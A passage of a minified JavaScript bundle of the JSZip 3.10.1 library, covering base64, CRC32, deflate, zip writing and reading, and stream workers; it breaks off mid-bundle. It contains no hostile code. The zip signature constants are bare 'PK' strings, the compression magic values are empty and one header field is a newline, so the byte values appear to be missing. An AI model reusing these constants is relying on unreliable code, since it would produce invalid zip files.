(() => {
  var e, n, t = {297: (e, n, t) => {
    e.exports = function e(n, t, r) {
      function a(o, s) {
        if (!t[o]) {
          if (!n[o]) {
            if (i) return i(o, true);
            var l = new Error("Cannot find module '" + o + "'");
            throw l.code = "MODULE_NOT_FOUND", l;
          }
          var u = t[o] = {exports: {}};
          n[o][0].call(u.exports, function (e) {
            return a(n[o][1][e] || e);
          }, u, u.exports, e, n, t, r);
        }
        return t[o].exports;
      }
      for (var i = undefined, o = 0; o < r.length; o++) a(r[o]);
      return a;
    }({1: [function (e, n, t) {
      "use strict";
      var r = e("./utils"), a = e("./support"), i = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
      t.encode = function (e) {
        for (var n, t, a, o, s, l, u, c = [], d = 0, f = e.length, m = f, h = "string" !== r.getTypeOf(e); d < e.length;) m = f - d, a = h ? (n = e[d++], t = d < f ? e[d++] : 0, d < f ? e[d++] : 0) : (n = e.charCodeAt(d++), t = d < f ? e.charCodeAt(d++) : 0, d < f ? e.charCodeAt(d++) : 0), o = n >> 2, s = (3 & n) << 4 | t >> 4, l = 1 < m ? (15 & t) << 2 | a >> 6 : 64, u = 2 < m ? 63 & a : 64, c.push(i.charAt(o) + i.charAt(s) + i.charAt(l) + i.charAt(u));
        return c.join("");
      }, t.decode = function (e) {
        var n, t, r, o, s, l, u = 0, c = 0, d = "data:";
        if (e.substr(0, 5) === d) throw new Error("Invalid base64 input, it looks like a data url.");
        var f, m = 3 * (e = e.replace(/[^A-Za-z0-9+/=]/g, "")).length / 4;
        if (e.charAt(e.length - 1) === i.charAt(64) && m--, e.charAt(e.length - 2) === i.charAt(64) && m--, m % 1 != 0) throw new Error("Invalid base64 input, bad content length.");
        for (f = a.uint8array ? new Uint8Array(0 | m) : new Array(0 | m); u < e.length;) n = i.indexOf(e.charAt(u++)) << 2 | (o = i.indexOf(e.charAt(u++))) >> 4, t = (15 & o) << 4 | (s = i.indexOf(e.charAt(u++))) >> 2, r = (3 & s) << 6 | (l = i.indexOf(e.charAt(u++))), f[c++] = n, 64 !== s && (f[c++] = t), 64 !== l && (f[c++] = r);
        return f;
      };
    }, {"./support": 30, "./utils": 32}], 2: [function (e, n, t) {
      "use strict";
      var r = e("./external"), a = e("./stream/DataWorker"), i = e("./stream/Crc32Probe"), o = e("./stream/DataLengthProbe");
      function s(e, n, t, r, a) {
        this.compressedSize = e, this.uncompressedSize = n, this.crc32 = t, this.compression = r, this.compressedContent = a;
      }
      s.prototype = {getContentWorker: function () {
        var e = new a(r.Promise.resolve(this.compressedContent)).pipe(this.compression.uncompressWorker()).pipe(new o("data_length")), n = this;
        return e.on("end", function () {
          if (this.streamInfo.data_length !== n.uncompressedSize) throw new Error("Bug : uncompressed data size mismatch");
        }), e;
      }, getCompressedWorker: function () {
        return new a(r.Promise.resolve(this.compressedContent)).withStreamInfo("compressedSize", this.compressedSize).withStreamInfo("uncompressedSize", this.uncompressedSize).withStreamInfo("crc32", this.crc32).withStreamInfo("compression", this.compression);
      }}, s.createWorkerFrom = function (e, n, t) {
        return e.pipe(new i).pipe(new o("uncompressedSize")).pipe(n.compressWorker(t)).pipe(new o("compressedSize")).withStreamInfo("compression", n);
      }, n.exports = s;
    }, {"./external": 6, "./stream/Crc32Probe": 25, "./stream/DataLengthProbe": 26, "./stream/DataWorker": 27}], 3: [function (e, n, t) {
      "use strict";
      var r = e("./stream/GenericWorker");
      t.STORE = {magic: "", compressWorker: function () {
        return new r("STORE compression");
      }, uncompressWorker: function () {
        return new r("STORE decompression");
      }}, t.DEFLATE = e("./flate");
    }, {"./flate": 7, "./stream/GenericWorker": 28}], 4: [function (e, n, t) {
      "use strict";
      var r = e("./utils"), a = function () {
        for (var e, n = [], t = 0; t < 256; t++) {
          e = t;
          for (var r = 0; r < 8; r++) e = 1 & e ? 3988292384 ^ e >>> 1 : e >>> 1;
          n[t] = e;
        }
        return n;
      }();
      n.exports = function (e, n) {
        return undefined !== e && e.length ? "string" !== r.getTypeOf(e) ? function (e, n, t, r) {
          var i = a, o = 0 + t;
          e ^= -1;
          for (var s = 0; s < o; s++) e = e >>> 8 ^ i[255 & (e ^ n[s])];
          return ~e;
        }(0 | n, e, e.length) : function (e, n, t, r) {
          var i = a, o = 0 + t;
          e ^= -1;
          for (var s = 0; s < o; s++) e = e >>> 8 ^ i[255 & (e ^ n.charCodeAt(s))];
          return ~e;
        }(0 | n, e, e.length) : 0;
      };
    }, {"./utils": 32}], 5: [function (e, n, t) {
      "use strict";
      t.base64 = false, t.binary = false, t.dir = false, t.createFolders = true, t.date = null, t.compression = null, t.compressionOptions = null, t.comment = null, t.unixPermissions = null, t.dosPermissions = null;
    }, {}], 6: [function (e, n, t) {
      "use strict";
      var r;
      r = "undefined" != typeof Promise ? Promise : e("lie"), n.exports = {Promise: r};
    }, {lie: 37}], 7: [function (e, n, t) {
      "use strict";
      var r = "undefined" != typeof Uint8Array && "undefined" != typeof Uint16Array && "undefined" != typeof Uint32Array, a = e("pako"), i = e("./utils"), o = e("./stream/GenericWorker"), s = r ? "uint8array" : "array";
      function l(e, n) {
        o.call(this, "FlateWorker/" + e), this._pako = null, this._pakoAction = e, this._pakoOptions = n, this.meta = {};
      }
      t.magic = "", i.inherits(l, o), l.prototype.processChunk = function (e) {
        this.meta = e.meta, null === this._pako && this._createPako(), this._pako.push(i.transformTo(s, e.data), false);
      }, l.prototype.flush = function () {
        o.prototype.flush.call(this), null === this._pako && this._createPako(), this._pako.push([], true);
      }, l.prototype.cleanUp = function () {
        o.prototype.cleanUp.call(this), this._pako = null;
      }, l.prototype._createPako = function () {
        this._pako = new a[this._pakoAction]({raw: true, level: this._pakoOptions.level || -1});
        var e = this;
        this._pako.onData = function (n) {
          e.push({data: n, meta: e.meta});
        };
      }, t.compressWorker = function (e) {
        return new l("Deflate", e);
      }, t.uncompressWorker = function () {
        return new l("Inflate", {});
      };
    }, {"./stream/GenericWorker": 28, "./utils": 32, pako: 38}], 8: [function (e, n, t) {
      "use strict";
      function r(e, n) {
        var t, r = "";
        for (t = 0; t < n; t++) r += String.fromCharCode(255 & e), e >>>= 8;
        return r;
      }
      function a(e, n, t, a, o, c) {
        var d, f, m = e.file, h = e.compression, p = c !== s.utf8encode, v = i.transformTo("string", c(m.name)), g = i.transformTo("string", s.utf8encode(m.name)), b = m.comment, w = i.transformTo("string", c(b)), k = i.transformTo("string", s.utf8encode(b)), y = g.length !== m.name.length, x = k.length !== b.length, R = "", _ = "", z = "", S = m.dir, j = m.date, E = {crc32: 0, compressedSize: 0, uncompressedSize: 0};
        n && !t || (E.crc32 = e.crc32, E.compressedSize = e.compressedSize, E.uncompressedSize = e.uncompressedSize);
        var C = 0;
        n && (C |= 8), p || !y && !x || (C |= 2048);
        var A = 0, I = 0;
        S && (A |= 16), "UNIX" === o ? (I = 798, A |= function (e, n) {
          var t = e;
          return e || (t = n ? 16893 : 33204), (65535 & t) << 16;
        }(m.unixPermissions, S)) : (I = 20, A |= function (e) {
          return 63 & (e || 0);
        }(m.dosPermissions)), d = j.getUTCHours(), d <<= 6, d |= j.getUTCMinutes(), d <<= 5, d |= j.getUTCSeconds() / 2, f = j.getUTCFullYear() - 1980, f <<= 4, f |= j.getUTCMonth() + 1, f <<= 5, f |= j.getUTCDate(), y && (_ = r(1, 1) + r(l(v), 4) + g, R += "up" + r(_.length, 2) + _), x && (z = r(1, 1) + r(l(w), 4) + k, R += "uc" + r(z.length, 2) + z);
        var F = "";
        return F += "\n", F += r(C, 2), F += h.magic, F += r(d, 2), F += r(f, 2), F += r(E.crc32, 4), F += r(E.compressedSize, 4), F += r(E.uncompressedSize, 4), F += r(v.length, 2), F += r(R.length, 2), {fileRecord: u.LOCAL_FILE_HEADER + F + v + R, dirRecord: u.CENTRAL_FILE_HEADER + r(I, 2) + F + r(w.length, 2) + "" + r(A, 4) + r(a, 4) + v + R + w};
      }
      var i = e("../utils"), o = e("../stream/GenericWorker"), s = e("../utf8"), l = e("../crc32"), u = e("../signature");
      function c(e, n, t, r) {
        o.call(this, "ZipFileWorker"), this.bytesWritten = 0, this.zipComment = n, this.zipPlatform = t, this.encodeFileName = r, this.streamFiles = e, this.accumulate = false, this.contentBuffer = [], this.dirRecords = [], this.currentSourceOffset = 0, this.entriesCount = 0, this.currentFile = null, this._sources = [];
      }
      i.inherits(c, o), c.prototype.push = function (e) {
        var n = e.meta.percent || 0, t = this.entriesCount, r = this._sources.length;
        this.accumulate ? this.contentBuffer.push(e) : (this.bytesWritten += e.data.length, o.prototype.push.call(this, {data: e.data, meta: {currentFile: this.currentFile, percent: t ? (n + 100 * (t - r - 1)) / t : 100}}));
      }, c.prototype.openedSource = function (e) {
        this.currentSourceOffset = this.bytesWritten, this.currentFile = e.file.name;
        var n = this.streamFiles && !e.file.dir;
        if (n) {
          var t = a(e, n, false, this.currentSourceOffset, this.zipPlatform, this.encodeFileName);
          this.push({data: t.fileRecord, meta: {percent: 0}});
        } else this.accumulate = true;
      }, c.prototype.closedSource = function (e) {
        this.accumulate = false;
        var n = this.streamFiles && !e.file.dir, t = a(e, n, true, this.currentSourceOffset, this.zipPlatform, this.encodeFileName);
        if (this.dirRecords.push(t.dirRecord), n) this.push({data: function (e) {
          return u.DATA_DESCRIPTOR + r(e.crc32, 4) + r(e.compressedSize, 4) + r(e.uncompressedSize, 4);
        }(e), meta: {percent: 100}}); else for (this.push({data: t.fileRecord, meta: {percent: 0}}); this.contentBuffer.length;) this.push(this.contentBuffer.shift());
        this.currentFile = null;
      }, c.prototype.flush = function () {
        for (var e = this.bytesWritten, n = 0; n < this.dirRecords.length; n++) this.push({data: this.dirRecords[n], meta: {percent: 100}});
        var t = this.bytesWritten - e, a = function (e, n, t, a, o) {
          var s = i.transformTo("string", o(a));
          return u.CENTRAL_DIRECTORY_END + "" + r(e, 2) + r(e, 2) + r(n, 4) + r(t, 4) + r(s.length, 2) + s;
        }(this.dirRecords.length, t, e, this.zipComment, this.encodeFileName);
        this.push({data: a, meta: {percent: 100}});
      }, c.prototype.prepareNextSource = function () {
        this.previous = this._sources.shift(), this.openedSource(this.previous.streamInfo), this.isPaused ? this.previous.pause() : this.previous.resume();
      }, c.prototype.registerPrevious = function (e) {
        this._sources.push(e);
        var n = this;
        return e.on("data", function (e) {
          n.processChunk(e);
        }), e.on("end", function () {
          n.closedSource(n.previous.streamInfo), n._sources.length ? n.prepareNextSource() : n.end();
        }), e.on("error", function (e) {
          n.error(e);
        }), this;
      }, c.prototype.resume = function () {
        return !!o.prototype.resume.call(this) && (!this.previous && this._sources.length ? (this.prepareNextSource(), true) : this.previous || this._sources.length || this.generatedError ? undefined : (this.end(), true));
      }, c.prototype.error = function (e) {
        var n = this._sources;
        if (!o.prototype.error.call(this, e)) return false;
        for (var t = 0; t < n.length; t++) try {
          n[t].error(e);
        } catch (e) {}
        return true;
      }, c.prototype.lock = function () {
        o.prototype.lock.call(this);
        for (var e = this._sources, n = 0; n < e.length; n++) e[n].lock();
      }, n.exports = c;
    }, {"../crc32": 4, "../signature": 23, "../stream/GenericWorker": 28, "../utf8": 31, "../utils": 32}], 9: [function (e, n, t) {
      "use strict";
      var r = e("../compressions"), a = e("./ZipFileWorker");
      t.generateWorker = function (e, n, t) {
        var i = new a(n.streamFiles, t, n.platform, n.encodeFileName), o = 0;
        try {
          e.forEach(function (e, t) {
            o++;
            var a = function (e, n) {
              var t = e || n, a = r[t];
              if (!a) throw new Error(t + " is not a valid compression method !");
              return a;
            }(t.options.compression, n.compression), s = t.options.compressionOptions || n.compressionOptions || {}, l = t.dir, u = t.date;
            t._compressWorker(a, s).withStreamInfo("file", {name: e, dir: l, date: u, comment: t.comment || "", unixPermissions: t.unixPermissions, dosPermissions: t.dosPermissions}).pipe(i);
          }), i.entriesCount = o;
        } catch (e) {
          i.error(e);
        }
        return i;
      };
    }, {"../compressions": 3, "./ZipFileWorker": 8}], 10: [function (e, n, t) {
      "use strict";
      function r() {
        if (!(this instanceof r)) return new r;
        if (arguments.length) throw new Error("The constructor with parameters has been removed in JSZip 3.0, please check the upgrade guide.");
        this.files = Object.create(null), this.comment = null, this.root = "", this.clone = function () {
          var e = new r;
          for (var n in this) "function" != typeof this[n] && (e[n] = this[n]);
          return e;
        };
      }
      (r.prototype = e("./object")).loadAsync = e("./load"), r.support = e("./support"), r.defaults = e("./defaults"), r.version = "3.10.1", r.loadAsync = function (e, n) {
        return (new r).loadAsync(e, n);
      }, r.external = e("./external"), n.exports = r;
    }, {"./defaults": 5, "./external": 6, "./load": 11, "./object": 15, "./support": 30}], 11: [function (e, n, t) {
      "use strict";
      var r = e("./utils"), a = e("./external"), i = e("./utf8"), o = e("./zipEntries"), s = e("./stream/Crc32Probe"), l = e("./nodejsUtils");
      function u(e) {
        return new a.Promise(function (n, t) {
          var r = e.decompressed.getContentWorker().pipe(new s);
          r.on("error", function (e) {
            t(e);
          }).on("end", function () {
            r.streamInfo.crc32 !== e.decompressed.crc32 ? t(new Error("Corrupted zip : CRC32 mismatch")) : n();
          }).resume();
        });
      }
      n.exports = function (e, n) {
        var t = this;
        return n = r.extend(n || {}, {base64: false, checkCRC32: false, optimizedBinaryString: false, createFolders: false, decodeFileName: i.utf8decode}), l.isNode && l.isStream(e) ? a.Promise.reject(new Error("JSZip can't accept a stream when loading a zip file.")) : r.prepareContent("the loaded zip file", e, true, n.optimizedBinaryString, n.base64).then(function (e) {
          var t = new o(n);
          return t.load(e), t;
        }).then(function (e) {
          var t = [a.Promise.resolve(e)], r = e.files;
          if (n.checkCRC32) for (var i = 0; i < r.length; i++) t.push(u(r[i]));
          return a.Promise.all(t);
        }).then(function (e) {
          for (var a = e.shift(), i = a.files, o = 0; o < i.length; o++) {
            var s = i[o], l = s.fileNameStr, u = r.resolve(s.fileNameStr);
            t.file(u, s.decompressed, {binary: true, optimizedBinaryString: true, date: s.date, dir: s.dir, comment: s.fileCommentStr.length ? s.fileCommentStr : null, unixPermissions: s.unixPermissions, dosPermissions: s.dosPermissions, createFolders: n.createFolders}), s.dir || (t.file(u).unsafeOriginalName = l);
          }
          return a.zipComment.length && (t.comment = a.zipComment), t;
        });
      };
    }, {"./external": 6, "./nodejsUtils": 14, "./stream/Crc32Probe": 25, "./utf8": 31, "./utils": 32, "./zipEntries": 33}], 12: [function (e, n, t) {
      "use strict";
      var r = e("../utils"), a = e("../stream/GenericWorker");
      function i(e, n) {
        a.call(this, "Nodejs stream input adapter for " + e), this._upstreamEnded = false, this._bindStream(n);
      }
      r.inherits(i, a), i.prototype._bindStream = function (e) {
        var n = this;
        (this._stream = e).pause(), e.on("data", function (e) {
          n.push({data: e, meta: {percent: 0}});
        }).on("error", function (e) {
          n.isPaused ? this.generatedError = e : n.error(e);
        }).on("end", function () {
          n.isPaused ? n._upstreamEnded = true : n.end();
        });
      }, i.prototype.pause = function () {
        return !!a.prototype.pause.call(this) && (this._stream.pause(), true);
      }, i.prototype.resume = function () {
        return !!a.prototype.resume.call(this) && (this._upstreamEnded ? this.end() : this._stream.resume(), true);
      }, n.exports = i;
    }, {"../stream/GenericWorker": 28, "../utils": 32}], 13: [function (e, n, t) {
      "use strict";
      var r = e("readable-stream").Readable;
      function a(e, n, t) {
        r.call(this, n), this._helper = e;
        var a = this;
        e.on("data", function (e, n) {
          a.push(e) || a._helper.pause(), t && t(n);
        }).on("error", function (e) {
          a.emit("error", e);
        }).on("end", function () {
          a.push(null);
        });
      }
      e("../utils").inherits(a, r), a.prototype._read = function () {
        this._helper.resume();
      }, n.exports = a;
    }, {"../utils": 32, "readable-stream": 16}], 14: [function (e, n, t) {
      "use strict";
      n.exports = {isNode: "undefined" != typeof Buffer, newBufferFrom: function (e, n) {
        if (Buffer.from && Buffer.from !== Uint8Array.from) return Buffer.from(e, n);
        if ("number" == typeof e) throw new Error('The "data" argument must not be a number');
        return new Buffer(e, n);
      }, allocBuffer: function (e) {
        if (Buffer.alloc) return Buffer.alloc(e);
        var n = new Buffer(e);
        return n.fill(0), n;
      }, isBuffer: function (e) {
        return Buffer.isBuffer(e);
      }, isStream: function (e) {
        return e && "function" == typeof e.on && "function" == typeof e.pause && "function" == typeof e.resume;
      }};
    }, {}], 15: [function (e, n, t) {
      "use strict";
      function r(e, n, t) {
        var r, a = i.getTypeOf(n), s = i.extend(t || {}, l);
        s.date = s.date || new Date, null !== s.compression && (s.compression = s.compression.toUpperCase()), "string" == typeof s.unixPermissions && (s.unixPermissions = parseInt(s.unixPermissions, 8)), s.unixPermissions && 16384 & s.unixPermissions && (s.dir = true), s.dosPermissions && 16 & s.dosPermissions && (s.dir = true), s.dir && (e = ("/" !== e.slice(-1) && (e += "/"), e)), s.createFolders && (r = h(e)) && v.call(this, r, true);
        var d = "string" === a && false === s.binary && false === s.base64;
        t && undefined !== t.binary || (s.binary = !d), (n instanceof u && 0 === n.uncompressedSize || s.dir || !n || 0 === n.length) && (s.base64 = false, s.binary = true, n = "", s.compression = "STORE", a = "string");
        var g;
        g = n instanceof u || n instanceof o ? n : f.isNode && f.isStream(n) ? new m(e, n) : i.prepareContent(e, n, s.binary, s.optimizedBinaryString, s.base64);
        var b = new c(e, g, s);
        this.files[e] = b;
      }
      var a = e("./utf8"), i = e("./utils"), o = e("./stream/GenericWorker"), s = e("./stream/StreamHelper"), l = e("./defaults"), u = e("./compressedObject"), c = e("./zipObject"), d = e("./generate"), f = e("./nodejsUtils"), m = e("./nodejs/NodejsStreamInputAdapter"), h = function (e) {
        "/" === e.slice(-1) && (e = e.substring(0, e.length - 1));
        var n = e.lastIndexOf("/");
        return 0 < n ? e.substring(0, n) : "";
      };
      var b = {load: function () {
        throw new Error("This method has been removed in JSZip 3.0, please check the upgrade guide.");
      }, forEach: function (e) {
        var n, t, r;
        for (n in this.files) r = this.files[n], (t = n.slice(this.root.length, n.length)) && n.slice(0, this.root.length) === this.root && e(t, r);
      }, filter: function (e) {
        var n = [];
        return this.forEach(function (t, r) {
          e(t, r) && n.push(r);
        }), n;
      }, file: function (e, n, t) {
        if (1 !== arguments.length) return e = this.root + e, r.call(this, e, n, t), this;
        if ("[object RegExp]" === Object.prototype.toString.call(e)) {
          var a = e;
          return this.filter(function (e, n) {
            return !n.dir && a.test(e);
          });
        }
        var i = this.files[this.root + e];
        return i && !i.dir ? i : null;
      }, folder: function (e) {
        if (!e) return this;
        if ("[object RegExp]" === Object.prototype.toString.call(e)) return this.filter(function (n, t) {
          return t.dir && e.test(n);
        });
        var n = this.root + e, t = v.call(this, n), r = this.clone();
        return r.root = t.name, r;
      }, remove: function (e) {
        e = this.root + e;
        var n = this.files[e];
        if (n || ("/" !== e.slice(-1) && (e += "/"), n = this.files[e]), n && !n.dir) delete this.files[e]; else for (var t = this.filter(function (n, t) {
          return t.name.slice(0, e.length) === e;
        }), r = 0; r < t.length; r++) delete this.files[t[r].name];
        return this;
      }, generate: function () {
        throw new Error("This method has been removed in JSZip 3.0, please check the upgrade guide.");
      }, generateInternalStream: function (e) {
        var n, t = {};
        try {
          if ((t = i.extend(e || {}, {streamFiles: false, compression: "STORE", compressionOptions: null, type: "", platform: "DOS", comment: null, mimeType: "application/zip", encodeFileName: a.utf8encode})).type = t.type.toLowerCase(), t.compression = t.compression.toUpperCase(), "binarystring" === t.type && (t.type = "string"), !t.type) throw new Error("No output type specified.");
          i.checkSupport(t.type), "darwin" !== t.platform && "freebsd" !== t.platform && "linux" !== t.platform && "sunos" !== t.platform || (t.platform = "UNIX"), "win32" === t.platform && (t.platform = "DOS");
          var r = t.comment || this.comment || "";
          n = d.generateWorker(this, t, r);
        } catch (e) {
          (n = new o("error")).error(e);
        }
        return new s(n, t.type || "string", t.mimeType);
      }, generateAsync: function (e, n) {
        return this.generateInternalStream(e).accumulate(n);
      }, generateNodeStream: function (e, n) {
        return (e = e || {}).type || (e.type = "nodebuffer"), this.generateInternalStream(e).toNodejsStream(n);
      }};
      n.exports = b;
    }, {"./compressedObject": 2, "./defaults": 5, "./generate": 9, "./nodejs/NodejsStreamInputAdapter": 12, "./nodejsUtils": 14, "./stream/GenericWorker": 28, "./stream/StreamHelper": 29, "./utf8": 31, "./utils": 32, "./zipObject": 35}], 16: [function (e, n, t) {
      "use strict";
      n.exports = e("stream");
    }, {stream: undefined}], 17: [function (e, n, t) {
      "use strict";
      var r = e("./DataReader");
      function a(e) {
        r.call(this, e);
        for (var n = 0; n < this.data.length; n++) e[n] = 255 & e[n];
      }
      e("../utils").inherits(a, r), a.prototype.byteAt = function (e) {
        return this.data[this.zero + e];
      }, a.prototype.lastIndexOfSignature = function (e) {
        for (var n = e.charCodeAt(0), t = e.charCodeAt(1), r = e.charCodeAt(2), a = e.charCodeAt(3), i = this.length - 4; 0 <= i; --i) if (this.data[i] === n && this.data[i + 1] === t && this.data[i + 2] === r && this.data[i + 3] === a) return i - this.zero;
        return -1;
      }, a.prototype.readAndCheckSignature = function (e) {
        var n = e.charCodeAt(0), t = e.charCodeAt(1), r = e.charCodeAt(2), a = e.charCodeAt(3), i = this.readData(4);
        return n === i[0] && t === i[1] && r === i[2] && a === i[3];
      }, a.prototype.readData = function (e) {
        if (this.checkOffset(e), 0 === e) return [];
        var n = this.data.slice(this.zero + this.index, this.zero + this.index + e);
        return this.index += e, n;
      }, n.exports = a;
    }, {"../utils": 32, "./DataReader": 18}], 18: [function (e, n, t) {
      "use strict";
      var r = e("../utils");
      function a(e) {
        this.data = e, this.length = e.length, this.index = 0, this.zero = 0;
      }
      a.prototype = {checkOffset: function (e) {
        this.checkIndex(this.index + e);
      }, checkIndex: function (e) {
        if (this.length < this.zero + e || e < 0) throw new Error("End of data reached (data length = " + this.length + ", asked index = " + e + "). Corrupted zip ?");
      }, setIndex: function (e) {
        this.checkIndex(e), this.index = e;
      }, skip: function (e) {
        this.setIndex(this.index + e);
      }, byteAt: function () {}, readInt: function (e) {
        var n, t = 0;
        for (this.checkOffset(e), n = this.index + e - 1; n >= this.index; n--) t = (t << 8) + this.byteAt(n);
        return this.index += e, t;
      }, readString: function (e) {
        return r.transformTo("string", this.readData(e));
      }, readData: function () {}, lastIndexOfSignature: function () {}, readAndCheckSignature: function () {}, readDate: function () {
        var e = this.readInt(4);
        return new Date(Date.UTC(1980 + (e >> 25 & 127), (e >> 21 & 15) - 1, e >> 16 & 31, e >> 11 & 31, e >> 5 & 63, (31 & e) << 1));
      }}, n.exports = a;
    }, {"../utils": 32}], 19: [function (e, n, t) {
      "use strict";
      var r = e("./Uint8ArrayReader");
      function a(e) {
        r.call(this, e);
      }
      e("../utils").inherits(a, r), a.prototype.readData = function (e) {
        this.checkOffset(e);
        var n = this.data.slice(this.zero + this.index, this.zero + this.index + e);
        return this.index += e, n;
      }, n.exports = a;
    }, {"../utils": 32, "./Uint8ArrayReader": 21}], 20: [function (e, n, t) {
      "use strict";
      var r = e("./DataReader");
      function a(e) {
        r.call(this, e);
      }
      e("../utils").inherits(a, r), a.prototype.byteAt = function (e) {
        return this.data.charCodeAt(this.zero + e);
      }, a.prototype.lastIndexOfSignature = function (e) {
        return this.data.lastIndexOf(e) - this.zero;
      }, a.prototype.readAndCheckSignature = function (e) {
        return e === this.readData(4);
      }, a.prototype.readData = function (e) {
        this.checkOffset(e);
        var n = this.data.slice(this.zero + this.index, this.zero + this.index + e);
        return this.index += e, n;
      }, n.exports = a;
    }, {"../utils": 32, "./DataReader": 18}], 21: [function (e, n, t) {
      "use strict";
      var r = e("./ArrayReader");
      function a(e) {
        r.call(this, e);
      }
      e("../utils").inherits(a, r), a.prototype.readData = function (e) {
        if (this.checkOffset(e), 0 === e) return new Uint8Array(0);
        var n = this.data.subarray(this.zero + this.index, this.zero + this.index + e);
        return this.index += e, n;
      }, n.exports = a;
    }, {"../utils": 32, "./ArrayReader": 17}], 22: [function (e, n, t) {
      "use strict";
      var r = e("../utils"), a = e("../support"), i = e("./ArrayReader"), o = e("./StringReader"), s = e("./NodeBufferReader"), l = e("./Uint8ArrayReader");
      n.exports = function (e) {
        var n = r.getTypeOf(e);
        return r.checkSupport(n), "string" !== n || a.uint8array ? "nodebuffer" === n ? new s(e) : a.uint8array ? new l(r.transformTo("uint8array", e)) : new i(r.transformTo("array", e)) : new o(e);
      };
    }, {"../support": 30, "../utils": 32, "./ArrayReader": 17, "./NodeBufferReader": 19, "./StringReader": 20, "./Uint8ArrayReader": 21}], 23: [function (e, n, t) {
      "use strict";
      t.LOCAL_FILE_HEADER = "PK", t.CENTRAL_FILE_HEADER = "PK", t.CENTRAL_DIRECTORY_END = "PK", t.ZIP64_CENTRAL_DIRECTORY_LOCATOR = "PK", t.ZIP64_CENTRAL_DIRECTORY_END = "PK", t.DATA_DESCRIPTOR = "PK";
    }, {}], 24: [function (e, n, t) {
      "use strict";
      var r = e("./GenericWorker"), a = e("../utils");
      function i(e) {
        r.call(this, "ConvertWorker to " + e), this.destType = e;
      }
      a.inherits(i, r), i.prototype.processChunk = function (e) {
        this.push({data: a.transformTo(this.destType, e.data), meta: e.meta});
      }, n.exports = i;
    }, {"../utils": 32, "./GenericWorker": 28}], 25: [function (e, n, t) {
      "use strict";
      var r = e("./GenericWorker"), a = e("../crc32");
      function i() {
        r.call(this, "Crc32Probe"), this.withStreamInfo("crc32", 0);
      }
      e("../utils").inherits(i, r), i.prototype.processChunk = function (e) {
        this.streamInfo.crc32 = a(e.data, this.streamInfo.crc32 || 0), this.push(e);
      }, n.exports = i;
    }, {"../crc32": 4, "../utils": 32, "./GenericWorker": 28}], 26: [function (e, n, t) {
      "use strict";
      var r = e("../utils"), a = e("./GenericWorker");
      function i(e) {
        a.call(this, "DataLengthProbe for " + e), this.propName = e, this.withStreamInfo(e, 0);
      }
      r.inherits(i, a), i.prototype.processChunk = function (e) {
        if (e) {
          var n = this.streamInfo[this.propName] || 0;
          this.streamInfo[this.propName] = n + e.data.length;
        }
        a.prototype.processChunk.call(this, e);
      }, n.exports = i;
    }, {"../utils": 32, "./GenericWorker": 28}], 27: [function (e, n, t) {
      "use strict";
      var r = e("../utils"), a = e("./GenericWorker");
      function i(e) {
        a.call(this, "DataWorker");
        var n = this;
        this.dataIsReady = false, this.index = 0, this.max = 0, this.data = null, this.type = "", this._tickScheduled = false, e.then(function (e) {
          n.dataIsReady = true, n.data = e, n.max = e && e.length || 0, n.type = r.getTypeOf(e), n.isPaused || n._tickAndRepeat();
        }, function (e) {
          n.error(e);
        });
      }
      r.inherits(i, a), i.prototype.cleanUp = function () {
        a.prototype.cleanUp.call(this), this.data = null;
      }, i.prototype.resume = function () {
        return !!a.prototype.resume.call(this) && (!this._tickScheduled && this.dataIsReady && (this._tickScheduled = true, r.delay(this._tickAndRepeat, [], this)), true);
      }, i.prototype._tickAndRepeat = function () {
        this._tickScheduled = false, this.isPaused || this.isFinished || (this._tick(), this.isFinished || (r.delay(this._tickAndRepeat, [], this), this._tickScheduled = true));
      }, i.prototype._tick = function () {
        if (this.isPaused || this.isFinished) return false;
        var e = null, n = Math.min(this.max, this.index + 16384);
        if (this.index >= this.max) return this.end();
        switch (this.type) {
          case "string":
            e = this.data.substring(this.index, n);
            break;
          case "uint8array":
            e = this.data.subarray(this.index, n);
            break;
          case "array":
          case "nodebuffer":
            e = this.data.slice(this.index, n);
        }
        return this.index = n, this.push({data: e, meta: {percent: this.max ? this.index / this.max * 100 : 0}});
      }, n.exports = i;
    }, {"../utils": 32, "./GenericWorker": 28}], 28: [function (e, n, t) {
      "use strict";
      function r(e) {
        this.name = e || "default", this.streamInfo = {}, this.generatedError = null, this.extraStreamInfo = {}, this.isPaused = true, this.isFinished = false, this.isLocked = false, this._listeners = {data: [], end: [], error: []}, this.previous = null;
      }
      r.prototype = {push: function (e) {
        this.emit("data", e);
      }, end: function () {
        if (this.isFinished) return false;
        this.flush();
        try {
          this.emit("end"), this.cleanUp(), this.isFinished = true;
        } catch (e) {
          this.emit("error", e);
        }
        return true;
      }, error: function (e) {
        return !this.isFinished && (this.isPaused ? this.generatedError = e : (this.isFinished = true, this.emit("error", e), this.previous && this.previous.error(e), this.cleanUp()), true);
      }, on: function (e, n) {
        return this._listeners[e].push(n), this;
      }, cleanUp: function () {
        this.streamInfo = this.generatedError = this.extraStreamInfo = null, this._listeners = [];
      }, emit: function (e, n) {
        if (this._listeners[e]) for (var t = 0; t < this._listeners[e].length; t++) this._listeners[e][t].call(this, n);
      }, pipe: function (e) {
        return e.registerPrevious(this);
      }, registerPrevious: function (e) {
        if (this.isLocked) throw new Error("The stream '" + this + "' has already been used.");
        this.streamInfo = e.streamInfo, this.mergeStreamInfo(), this.previous = e;
        var n = this;
        return e.on("data", function (e) {
          n.processChunk(e);
        }), e.on("end", function () {
          n.end();
        }), e.on("error", function (e) {
          n.error(e);
        }), this;
      }, pause: function () {
        return !this.isPaused && !this.isFinished && (this.isPaused = true, this.previous && this.previous.pause(), true);
      }, resume: function () {
        if (!this.isPaused || this.isFinished) return false;
        var e = this.isPaused = false;
        return this.generatedError && (this.error(this.generatedError), e = true), this.previous && this.previous.resume(), !e;
      }, flush: function () {}, processChunk: function (e) {
        this.push(e);
      }, withStreamInfo: function (e, n) {
        return this.extraStreamInfo[e] = n, this.mergeStreamInfo(), this;
      }, mergeStreamInfo: function () {
        for (var e in this.extraStreamInfo) Object.prototype.hasOwnProperty.call(this.extraStreamInfo, e) && (this.streamInfo[e] = this.extraStreamInfo[e]);
      }, lock: function () {
        if (this.isLocked) throw new Error("The stream '" + this + "' has already been used.");
        this.isLocked = true, this.previous && this.previous.lock();
      }, toString: function () {
        var e = "Worker " + this.name;
        return this.previous ? this.previous + " -> " + e : e;
      }}, n.exports = r;
    }, {}], 29: [function (e, n, t) {
      "use strict";
